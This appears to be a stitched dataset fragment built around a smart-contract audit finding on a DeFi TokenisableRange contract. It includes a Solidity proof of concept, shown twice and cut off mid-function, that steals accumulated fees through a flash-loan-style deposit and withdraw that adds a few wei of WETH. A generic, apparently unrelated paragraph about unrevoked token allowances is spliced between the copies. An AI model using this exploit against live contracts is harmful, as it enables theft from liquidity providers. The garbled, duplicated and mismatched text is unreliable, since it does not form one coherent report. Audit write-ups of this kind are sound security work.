USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.

The issue is that when the external contract's address changes, the old allowance for the previous external contract is not revoked and a new allowance is granted to the new external contract without any checks on whether the old allowance should be maintained or revoked.\n\nTo exploit this vulnerability, an attacker can create a malicious external contract that mimics the legitimate one but has a different address. When the attacker's contract is approved by the smart contract, it can perform arbitrary calls on the smart contract's behalf, potentially stealing funds or causing other unwanted effects.\n\nTherefore, the smart contract code should include logic to revoke the token allowance of the old external contract when its address changes and grant a new approval to the new external contract.

        "gtraw": "\n# Vulnerability details\n\nThe `TokenisableRange` is designed to always collect trading fees from the Uniswap V3 pool, whenever there is a liquidity event (`deposit` or `withdraw`). These fees may be reinvested in the pool, or may be held in form of `fee0` and `fee1` ERC-20 balance held by the TokenisableRange contract.\n\nWhen a user deposits liquidity in the range, they pay asset tokens, and receive back liquidity tokens, which give them a share of the TokenisableRange assets (liquidity locked in Unisvap V3, plus fee0, and fee1).\n\nTo prevent users from stealing fees, there are several mechanisms in place:\n1. fees are, as said, always collected whenever liquidity is added or removed, and whenever they exceed 1% of the liquidity in the pool, they are re-invested in Uniswap V3. The intention of this check seems to be limiting the value locked in these fees\n2. whenever a user deposits liquidity to the range, the LP tokens given to them are scaled down by the value of the fees, so the participation in fees \"is not given away for free\"\n\nBoth of these mechanisms can however be worked around:\n1. the 1% check is done on the `fee0` and `fee1` **amounts** compared to the theoretical pool amounts, and **not on the total value of the fees** as compared to the total value locked in the pool. This means that when the price changes significantly from when fees were accumulated, the combined value of the fees can exceed, potentially by much, the 1% intended cap, without the reinvestment happening before liquidity events. A malicious user can then monitor and act in such market conditions.\n2. the downscaling of the LP tokens minted to the user happens only if none of the provided liquidity is added to the pool fees instead of the Uniswap V3 position. The user can send just a few wei's of tokens to short-circuit the downscaling, and have a share of fees \"for free\".\n\n## Impact\nGiven a TokenisableRange contract in the right state (high value locked in fees, but still no reinvestment happening) a user can maliciously craft a `deposit` and `withdraw` sequence (why not, with flash-loaned assets) to steal most of the fees (`fee0`, `fee1`) held by the pool before distribution.\n\n## Proof of Concept\nBelow is a working PoC that shows under real market conditions how most of the fees (>3% of the pool assets) can be s stolen risk-free by simply depositing and withdrawing a large quantity of liquidity:\n```Solidity\n    function testStolenFeesPoc() public {\n        vm.createSelectFork(\n            \"mainnet\",\n            17811921\n        );\n\n        vm.prank(tokenWhale);\n        USDC.transfer(alice, 100_000e6);\n\n        vm.startPrank(alice);\n        TokenisableRange tr = new TokenisableRange();\n\n        // out of range: WETH is more valuable than that (about 1870 USDC on this block 17811921); \n        // the pool will hold 0 WETH\n        tr.initProxy(AaveOracle, USDC, WETH, 500e10, 1000e10, \"Test1\", \"T1\", false);\n\n        USDC.approve(address(tr), 100_000e6);\n        tr.init(100_000e6, 0);\n\n        // time passes, and the pool trades in range, accumulating fees\n        uint256 fee0 = 1_000e6;\n        uint256 fee1 = 2e18;\n\n        vm.mockCall(address(UniswapV3UsdcNFPositionManager), \n            abi.encodeWithSelector(INonfungiblePositionManager.collect.selector), \n            abi.encode(fee0, fee1));\n\n        vm.stopPrank();\n        vm.startPrank(tokenWhale);\n        USDC.transfer(address(tr), fee0);\n        WETH.transfer(address(tr), fee1);\n\n        // now the price is back to 1870 USDC,\n        // the undistributed fees are 1k USDC and 2 WETH, \n        // in total about $5k or 5% of the pool value \n        // (the percentage can be higher with bigger price swings)\n        // but still, they are not reinvested\n        tr.claimFee();\n        vm.clearMockedCalls();\n        require(tr.fee0() != 0);\n        require(tr.fee1() != 0);\n\n        // an attacker now can flashloan & deposit an amount that will give them\n        // the majority of the pool liquidity, then withdraw for a profit\n        uint256 usdcBalanceBefore = USDC.balanceOf(tokenWhale);\n        uint256 wethBalanceBefore = WETH.balanceOf(tokenWhale);\n        uint256 poolSharesBefore = tr.balanceOf(tokenWhale);\n\n        USDC.approve(address(tr), 10_000_000e6);\n        // this is the hack: we add just a tiny little bit of WETH so TokenisableRange doesn't\n        // count the value locked in fees in assigning the LP tokens\n        WETH.approve(address(tr), 1000);\n        uint256 deposited = tr.deposit(10_000_000e6, 1000);\n        tr.withdraw(deposited, 0, 0);\n\n        // the profit here is\n        // 1 wei of USDC lost, probably to rounding\n        console2.log(int(USDC.balanceOf(tokenWhale)) - int(usdcBalanceBefore)); \n        // 1.58 WETH of profit, which is most of the fees, \n        // and definitely more than 1% of the pool.
